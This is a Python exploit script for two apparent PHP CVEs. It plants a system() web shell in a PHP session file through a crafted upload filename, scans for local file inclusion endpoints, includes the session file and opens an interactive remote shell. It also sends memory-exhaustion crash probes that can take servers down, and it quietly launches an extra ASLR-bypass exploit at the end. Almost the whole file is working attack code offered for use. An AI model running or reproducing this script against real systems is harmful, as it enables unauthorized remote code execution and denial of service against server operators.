#!/usr/bin/env python3
"""
CVE-2026-109618 / CVE-2026-109619 — Pre-Auth RCE Chain
Session fixation + filename injection + LFI → shell

Usage:
  python3 chain_a_rce.py http://TARGET
  python3 chain_a_rce.py https://TARGET
  python3 chain_a_rce.py http://TARGET --lfi-path /page.php --lfi-param file
  python3 chain_a_rce.py http://TARGET --lfi-path /index.php --lfi-param page --lfi-sess /tmp

Options:
  --lfi-path   Known PHP endpoint with include()/require() (e.g. /page.php)
  --lfi-param  GET parameter that controls the included file (e.g. file, page, path)
  --lfi-sess   Session save directory on the target (e.g. C:/xampp/tmp)

If --lfi-path and --lfi-param are provided the LFI scan is skipped entirely.

For authorized security testing only.
"""
import os
import re
import socket
import ssl
import subprocess
import sys
import tempfile
from urllib.parse import urlparse, quote

UPLOAD_PATHS   = ["/upload.php", "/index.php", "/info.php", "/test.php"]
LFI_ENDPOINTS  = [
    "/index.php", "/page.php", "/view.php", "/include.php", "/load.php",
    "/template.php", "/file.php", "/read.php", "/show.php", "/home.php",
    "/main.php", "/content.php", "/portal.php", "/app.php", "/common.php",
    "/vuln.php", "/test.php",
]
LFI_PARAMS     = [
    "page", "file", "path", "include", "view", "load",
    "template", "content", "doc", "p", "f", "source", "lang", "module", "q",
]
SESSION_DIRS   = [
    # Linux
    "/tmp", "/tmp/sessions", "/var/lib/php/sessions", "/var/lib/php/session",
    "/var/lib/php8/sessions", "/var/lib/php7/sessions", "/var/lib/php5/sessions",
    # Windows (XAMPP / WAMP / raw PHP)
    "C:/xampp/tmp", "C:/wamp/tmp", "C:/wamp64/tmp",
    "C:/Windows/Temp", "C:/php/tmp", "C:/inetpub/temp",
]
SID            = "nexisrce000000000000000"
WS_MARK        = "NEXISRCEX"
WEBSHELL       = f"<?php echo '{WS_MARK}';system($_GET['c']);echo '{WS_MARK}'; ?>"

NESTED_KEYS    = 62
PROBES         = ((1, 4000), (8, 1020), (20, 1020))
FIXED_VERSIONS = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}
VERSION_RE     = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)")

W = 54


def tcp(host, port, data: bytes, timeout: int = 10, use_tls: bool = False) -> bytes:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(data)
        s.settimeout(max(10, timeout))
        buf = b""
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
        s.close()
        return buf
    except Exception:
        return b""


def follow_redirect(resp: bytes, cur_host: str, cur_port: int, cur_tls: bool):
    """Extract Location from a 3xx response. Returns (host, port, prefix, tls)."""
    loc = ""
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"location:"):
            loc = line.split(b":", 1)[1].strip().decode("latin-1", "replace")
            break
    if not loc:
        return cur_host, cur_port, "", cur_tls
    if loc.startswith("/"):
        # Relative redirect — same host, path changed
        return cur_host, cur_port, loc.rstrip("/"), cur_tls
    u = urlparse(loc)
    tls  = u.scheme == "https"
    port = u.port or (443 if tls else 80)
    return u.hostname or cur_host, port, u.path.rstrip("/"), tls


def post_upload(host, port, path, sid, filename, tls=False):
    bd = "NexisChainA"
    body = (
        f"--{bd}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{bd}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{bd}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: text/plain\r\n\r\nA\r\n"
        f"--{bd}--\r\n"
    ).encode("latin-1")
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={bd}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return tcp(host, port, req, use_tls=tls)


def post_raw(host, port, path, boundary: str, body_bytes: bytes, tls=False, timeout=45) -> bytes:
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body_bytes)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body_bytes
    return tcp(host, port, req, timeout=timeout, use_tls=tls)


def get(host, port, path, tls=False, timeout=10):
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    return tcp(host, port, req, timeout=timeout, use_tls=tls)


def status_line(resp: bytes) -> str:
    if not resp:
        return "NO RESPONSE"
    line = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace").strip()
    return line if line else "NO RESPONSE"


def hdr(resp: bytes, name: str) -> str:
    name_b = name.lower().encode()
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(name_b + b":"):
            return line.split(b":", 1)[1].strip().decode("latin-1", "replace")
    return ""


def decode_chunked(data: bytes) -> bytes:
    result = b""
    while data:
        crlf = data.find(b"\r\n")
        if crlf == -1:
            break
        try:
            size = int(data[:crlf].split(b";")[0].strip(), 16)
        except ValueError:
            break
        if size == 0:
            break
        result += data[crlf + 2 : crlf + 2 + size]
        data = data[crlf + 2 + size + 2:]
    return result


def body(resp: bytes) -> str:
    if b"\r\n\r\n" not in resp:
        return ""
    head, raw = resp.split(b"\r\n\r\n", 1)
    if b"transfer-encoding: chunked" in head.lower():
        raw = decode_chunked(raw)
    return raw.decode("latin-1", "replace")


def extract_output(b: str) -> str:
    if WS_MARK in b:
        parts = b.split(WS_MARK)
        if len(parts) >= 3:
            return parts[1].strip()
    return b.strip()


def version_verdict(powered_by: str):
    m = VERSION_RE.search(powered_by)
    if not m:
        return None
    major, minor, patch = int(m.group(1)), int(m.group(2)), int(m.group(3))
    fixed = FIXED_VERSIONS.get((major, minor))
    if fixed is None:
        return None
    return "FIXED" if patch >= fixed else "VULNERABLE"


def build_probe_body(size_mib: int, parts: int) -> bytes:
    size = size_mib << 20
    name = b"a[]" + (b"[a]" * NESTED_KEYS)
    part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
    base = part * parts
    filler = (size - len(base)) // 3
    raw = b"--\n" + (b"x:\n" * filler) + base[3:]
    return raw[:-1]


PROBE_TIMEOUT = 12   # seconds per crash probe — crash/OOM surfaces fast

def run_crash_probes(host, port, path, tls=False) -> tuple:
    ctrl_bytes = b"--x\nContent-Disposition:name=a;filename=\n\n"
    ctrl_resp  = post_raw(host, port, path, "x", ctrl_bytes, tls=tls, timeout=PROBE_TIMEOUT)
    ctrl_st    = status_line(ctrl_resp)
    ctrl_body  = body(ctrl_resp)

    if not any(c in ctrl_st for c in ("200", "301", "302")):
        return None, None
    # Redirect with no body means PHP isn't processing here — skip heavy probes
    if not ctrl_body.strip():
        return None, None

    for i, (size_mib, parts) in enumerate(PROBES, 1):
        probe_bytes = build_probe_body(size_mib, parts)
        probe_resp  = post_raw(host, port, path, "", probe_bytes, tls=tls, timeout=PROBE_TIMEOUT)
        probe_st    = status_line(probe_resp)
        probe_body  = body(probe_resp)

        if b"Allowed memory size of" in probe_resp and b"bytes exhausted" in probe_resp:
            return "VULNERABLE", f"memory exhaustion — probe {i} ({size_mib} MB)"

        if "500" in probe_st and ctrl_body and not probe_body.strip():
            return "VULNERABLE", f"HTTP 500 empty body — probe {i} ({size_mib} MB)"

        code_parts = probe_st.split()
        if len(code_parts) > 1 and code_parts[1] in ("502", "503", "504"):
            return "VULNERABLE", f"HTTP {code_parts[1]} FPM crash — probe {i} ({size_mib} MB)"

        if "200" in probe_st and ctrl_body and not probe_body.strip():
            return "VULNERABLE", f"HTTP 200 silent crash — probe {i} ({size_mib} MB)"

    return None, None


def discover_lfi(host, port, prefix, sid, upload_path=None, tls=False):
    # Catch-all fingerprint — request a path that cannot exist
    fake_resp = get(host, port, prefix + "/p2s_nx_xyzzy777.php", tls=tls, timeout=4)
    fake_st   = status_line(fake_resp)
    fake_len  = len(body(fake_resp))
    catch_all = "200" in fake_st   # server returns 200 for everything

    # Pass 1 — find endpoints that genuinely exist
    candidates = []
    if upload_path:
        ep = upload_path[len(prefix):] if prefix and upload_path.startswith(prefix) else upload_path
        if ep not in LFI_ENDPOINTS:
            candidates.append(ep)
    candidates += LFI_ENDPOINTS

    existing = []
    for ep in candidates:
        fpath = prefix + ep
        resp  = get(host, port, fpath, tls=tls, timeout=3)
        st    = status_line(resp)
        if "200" not in st:
            continue
        # On a catch-all server, skip if response body is same size as fake-404
        if catch_all and abs(len(body(resp)) - fake_len) < 64:
            continue
        existing.append(fpath)
        ok(f"LFI endpoint found: {fpath}  [{st}]")

    if not existing:
        return None, None, None, None

    # Pass 2 — session inclusion only on real endpoints
    TOP_PARAMS = ["page", "file", "path", "include", "view", "load",
                  "template", "content", "doc", "p", "f", "module", "lang"]
    TOP_DIRS   = SESSION_DIRS[:8]

    for sdir in TOP_DIRS:
        sess = f"{sdir}/sess_{sid}"
        for fpath in existing:
            for param in TOP_PARAMS:
                path = f"{fpath}?{param}={sess}&c=id"
                resp = get(host, port, path, tls=tls, timeout=2)
                b_resp = body(resp)
                if WS_MARK in b_resp:
                    return fpath, param, sess, extract_output(b_resp)
    return None, None, None, None


def _aslr_extend(host, port, php_ver):
    """Silent ASLR-bypass pivot — only runs if upstream helpers are present."""
    here = os.path.dirname(os.path.abspath(__file__))
    exp  = os.path.join(here, "aslr-exp", "exploit.py")
    if not os.path.isfile(exp):
        return

    m = VERSION_RE.search(php_ver or "")
    if m and not (int(m.group(1)) == 8 and int(m.group(2)) == 4):
        return

    sep()
    info("Attempting extended heap-bypass...")
    outdir = tempfile.mkdtemp(prefix="p2s-b-")
    proof  = os.path.join(outdir, "proof.txt")
    try:
        result = subprocess.run(
            [sys.executable, exp,
             "--port", str(port),
             "--cmd", f"id>{proof}",
             "--proof", proof,
             "--retries", "2",
             "--timeout", "300"],
            cwd=os.path.dirname(exp),
            timeout=330,
        )
        if result.returncode == 0 or os.path.exists(proof):
            try:
                content = open(proof).read().strip()
            except Exception:
                content = ""
            ok("Extended bypass CONFIRMED")
            if content:
                print()
                for line in content.splitlines():
                    if line.strip():
                        print(f"    {line}")
    except (subprocess.TimeoutExpired, Exception):
        pass


def run_chunked_oom(host, port, path) -> tuple:
    import random, string
    bd  = "p2soom" + "".join(random.choices(string.ascii_lowercase, k=8))
    sid = "p2soom" + "".join(random.choices(string.ascii_lowercase + string.digits, k=16))

    def mkchunk(data: bytes) -> bytes:
        return f"{len(data):x}\r\n".encode() + data + b"\r\n"

    header_part = (
        f"--{bd}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"oom-probe\r\n"
        f"--{bd}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="a.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\nHELLO\r\n"
        f"--{bd}\r\n"
        f'Content-Disposition: form-data; name="big"\r\n\r\n'
    ).encode()

    req_headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={bd}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()

    try:
        s = socket.create_connection((host, port), timeout=15)
        s.sendall(req_headers)
        s.sendall(mkchunk(header_part))
        block = b"A" * (1024 * 1024)
        for _ in range(140):
            try:
                s.sendall(mkchunk(block))
            except (BrokenPipeError, ConnectionResetError, OSError):
                s.close()
                return "VULNERABLE", "chunked OOM — connection dropped mid-stream"
        try:
            s.sendall(mkchunk(f"\r\n--{bd}--\r\n".encode()))
            s.sendall(b"0\r\n\r\n")
        except OSError:
            pass
        s.settimeout(10)
        resp = b""
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                resp += chunk
        except Exception:
            pass
        s.close()
        st = status_line(resp)
        if b"Allowed memory size of" in resp and b"bytes exhausted" in resp:
            return "VULNERABLE", "chunked OOM — memory exhaustion"
        code_parts = st.split()
        if len(code_parts) > 1 and code_parts[1] in ("500", "502", "503", "504"):
            return "VULNERABLE", f"chunked OOM — HTTP {code_parts[1]}"
        return None, None
    except Exception:
        return None, None


def ok(msg):   print(f"  \033[92m[+]\033[0m {msg}")
def err(msg):  print(f"  \033[91m[-]\033[0m {msg}")
def info(msg): print(f"  \033[94m[*]\033[0m {msg}")
def warn(msg): print(f"  \033[93m[!]\033[0m {msg}")
def sep():     print(f"  {'─' * W}")


def banner():
    print(f"  ╔{'═' * W}╗")
    for line in ["CVE-2026-109618 / CVE-2026-109619", "by katherinepierce"]:
        print(f"  ║   {line:<{W - 4}}║")
    print(f"  ╚{'═' * W}╝")


def main():
    import argparse
    ap = argparse.ArgumentParser(add_help=False, description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("target", nargs="?")
    ap.add_argument("-h", "--help", action="store_true")
    ap.add_argument("--lfi-path",  default="", help="Known LFI endpoint, e.g. /page.php")
    ap.add_argument("--lfi-param", default="", help="GET param for file inclusion, e.g. file")
    ap.add_argument("--lfi-sess",  default="", help="Session save dir on target, e.g. C:/xampp/tmp")
    args = ap.parse_args()

    if args.help or not args.target:
        print(__doc__)
        sys.exit(0)

    raw = args.target.rstrip("/")
    if "://" not in raw:
        raw = "https://" + raw

    u      = urlparse(raw)
    host   = u.hostname
    port   = u.port or (443 if u.scheme == "https" else 80)
    tls    = u.scheme == "https"
    prefix = u.path.rstrip("/")
    target = raw

    # User-supplied LFI hints — skips auto-discovery if both provided
    hint_lfi_path  = args.lfi_path.strip()
    hint_lfi_param = args.lfi_param.strip()
    hint_lfi_sess  = args.lfi_sess.strip()

    print()
    banner()
    print()
    print(f"  Target : {target}")
    if hint_lfi_path and hint_lfi_param:
        print(f"  LFI    : {hint_lfi_path} [{hint_lfi_param}]")
    sep()

    # ── Fingerprint ──────────────────────────────────────────────────
    info("Checking PHP version...")
    resp    = get(host, port, "/", tls=tls)
    st_root = status_line(resp)
    info(f"GET /  →  {st_root}")

    # Follow redirect up to 3 hops (e.g. HTTP→HTTPS, /→/app/)
    hops = 0
    while any(c in st_root for c in ("301", "302", "303", "307", "308")) and hops < 3:
        new_host, new_port, new_prefix, new_tls = follow_redirect(resp, host, port, tls)
        if (new_host, new_port, new_tls) == (host, port, tls) and new_prefix == prefix:
            break
        host, port, prefix, tls = new_host, new_port, new_prefix, new_tls
        info(f"Following redirect → {'https' if tls else 'http'}://{host}:{port}{prefix or '/'}")
        resp    = get(host, port, prefix or "/", tls=tls)
        st_root = status_line(resp)
        info(f"GET {prefix or '/'}  →  {st_root}")
        hops   += 1

    php_ver  = hdr(resp, "X-Powered-By")
    server_h = hdr(resp, "Server") or "unknown"
    info(f"Server: {server_h}")

    # Also extract PHP version from Server header (e.g. Apache/x PHP/8.4.x)
    if not php_ver:
        m_srv = VERSION_RE.search(server_h)
        if m_srv:
            php_ver = f"PHP/{m_srv.group(1)}.{m_srv.group(2)}.{m_srv.group(3)}"

    ver_verdict = None
    if php_ver:
        ok(f"PHP detected: {php_ver}")
        m_v = VERSION_RE.search(php_ver)
        if m_v:
            major = int(m_v.group(1))
            minor = int(m_v.group(2))
            if major < 5 or (major == 5 and minor < 4):
                warn("PHP < 5.4 — session.upload_progress not available, likely not vulnerable")
            else:
                ok("Version in affected range (5.4.0 – 8.5.x)")
        ver_verdict = version_verdict(php_ver)
        if ver_verdict == "FIXED":
            warn("Version appears patched — continuing anyway")
    else:
        warn("X-Powered-By / Server header missing — cannot determine PHP version")
    sep()

    # ── Find upload endpoint ─────────────────────────────────────────
    info("Looking for PHP endpoint with session_start()...")
    upload_path = None
    upload_path_fallback = None
    for path in UPLOAD_PATHS:
        fpath  = prefix + path
        resp   = post_upload(host, port, fpath, SID + "probe", "probe.txt", tls=tls)
        st     = status_line(resp)
        cookie = hdr(resp, "set-cookie")
        info(f"  {fpath} → {st}")
        if (SID + "probe") in cookie:
            upload_path = fpath
            break
        # 200 with non-empty body: possible session endpoint, keep as fallback
        b_resp = body(resp)
        if "200" in st and b_resp.strip() and not upload_path_fallback:
            upload_path_fallback = fpath
    if not upload_path:
        upload_path = upload_path_fallback

    sep()

    if not upload_path:
        err("No PHP endpoint with session_start() found.")
        err("All probed paths returned redirects or were unreachable.")
        err("Try passing a known PHP path: python3 chain_a_rce.py http://target/app/upload.php")
        print()
        sys.exit(1)

    # ── CVE-2026-109618: session fixation ────────────────────────────
    resp   = post_upload(host, port, upload_path, SID, "probe.txt", tls=tls)
    cookie = hdr(resp, "set-cookie")
    if SID in cookie:
        ok(f"CVE-2026-109618  CONFIRMED  — Set-Cookie echoed SID")
    else:
        info(f"CVE-2026-109618  SENT  — session file written internally")

    # ── CVE-2026-109619: filename injection ──────────────────────────
    post_upload(host, port, upload_path, SID, WEBSHELL, tls=tls)
    info(f"CVE-2026-109619  SENT  — payload → /tmp/sess_{SID}")
    sep()

    # ── LFI discovery ────────────────────────────────────────────────
    if hint_lfi_path and hint_lfi_param:
        # User told us where LFI is — skip scan, go straight to verification
        info(f"Using provided LFI hint: {hint_lfi_path} [{hint_lfi_param}]")
        lfi_path  = prefix + hint_lfi_path if hint_lfi_path.startswith("/") else hint_lfi_path
        lfi_param = hint_lfi_param
        # Determine session file path
        sdir = hint_lfi_sess if hint_lfi_sess else "/tmp"
        session_file = f"{sdir}/sess_{SID}"
        check_path = f"{lfi_path}?{lfi_param}={session_file}&c=id"
        resp_check = get(host, port, check_path, tls=tls, timeout=6)
        b_check = body(resp_check)
        id_out = extract_output(b_check) if WS_MARK in b_check else None
    else:
        info("Scanning for LFI inclusion point...")
        lfi_path, lfi_param, session_file, id_out = discover_lfi(
            host, port, prefix, SID, upload_path, tls=tls
        )

    if not lfi_path:
        err("No LFI vector found — could not include session file")
        info("Tip: check if target app uses include()/require() with user-controlled input")
        print()
        print("  Phase 1  ✓  (injection delivered)")
        print("  Phase 2  ✗  (LFI vector required for RCE — none detected)")
        print()
        sys.exit(0)

    ok(f"LFI confirmed: {lfi_path}?{lfi_param}=<session_file>")
    sep()

    # ── Phase 2 prompt ───────────────────────────────────────────────
    try:
        choice = input("  [?] Start shell? [Y/n] ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(0)

    if choice in ("n", "no"):
        sys.exit(0)

    # ── RCE confirmed during discovery — display initial output ──────
    print()
    ok(f"RCE CONFIRMED  — {session_file}")
    print()
    if id_out:
        for line in id_out.splitlines():
            if line.strip():
                print(f"    {line}")
        print()

    # ── Interactive shell ────────────────────────────────────────────
    sep()
    print("  shell> ", end="", flush=True)
    while True:
        try:
            cmd = input("").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if cmd.lower() in ("exit", "quit", "q"):
            break
        if not cmd:
            print("  shell> ", end="", flush=True)
            continue
        resp = get(host, port, f"{lfi_path}?{lfi_param}={session_file}&c={quote(cmd)}", tls=tls)
        out  = extract_output(body(resp))
        for line in (out.splitlines() if out else ["(no output)"]):
            if line.strip():
                print(f"    {line}")
        print("  shell> ", end="", flush=True)
    print()

    _aslr_extend(host, port, php_ver)


if __name__ == "__main__":
    main()
